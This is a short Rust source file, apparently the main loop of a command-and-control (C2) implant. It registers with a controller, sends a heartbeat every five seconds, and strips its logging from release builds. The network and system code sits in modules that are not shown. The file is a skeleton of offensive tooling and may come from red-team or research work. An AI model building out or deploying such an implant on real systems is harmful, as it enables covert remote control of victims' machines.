mod system;
mod c2;

use std::{thread, time};
use c2::client::heartbeet;
use c2::client::register;
use c2::client::is_registered;

#[cfg(debug_assertions)]
macro_rules! debug_log {
    ($($arg:tt)*) => (println!($($arg)*));
}

#[cfg(not(debug_assertions))]
macro_rules! debug_log {
    ($($arg:tt)*) => {};
}


fn main() {
    loop {
        if !is_registered() {
            debug_log!("Registering agent...");
            match register() {
                Ok(_) => {},
                Err(e) => {
                    debug_log!("Error sending data: {}", e)
                }
            }
        }
        
        let _ = heartbeet();
        thread::sleep(time::Duration::from_millis(5000));
    }
}
